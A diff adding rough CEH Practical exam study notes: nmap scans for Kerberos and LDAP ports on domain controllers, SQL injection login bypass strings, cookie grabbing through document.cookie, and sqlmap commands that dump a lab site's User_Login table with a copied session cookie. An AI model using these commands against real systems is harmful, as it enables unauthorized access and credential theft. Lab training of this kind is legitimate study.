@@ -753,6 +753,39 @@ The CEH Practical Exam is your gateway to becoming a skilled ethical hacker with
 
 
 
+---
+
+
+dns  kerberos and ldap , domain control ip 
+
+nmap -p 88,389 1.1.1.0/24 --open
+
+
+nmap -A 1.1.1.1 --open fqdn  , domain name 
+
+SQLMAP SQL INJECTION
+dvwa  logn 
+' or 1==1#
+' or 1==1--
+
+click inspacet 
+document.cookie
+you got cokkie
+
+
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied ]" -D moviescope -T User_Login --dump command to dump all the User_Login table content.
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied ]" -D moviescope -T User_Login --dump command
+
+https://github.com/pasi9192-lgtm/ceh-notes.git
+
+https://github.com/pasi9192-lgtm/ceh-notes
+
+
+port 88 and 389 domain controller 
+
+
+
 
 
  
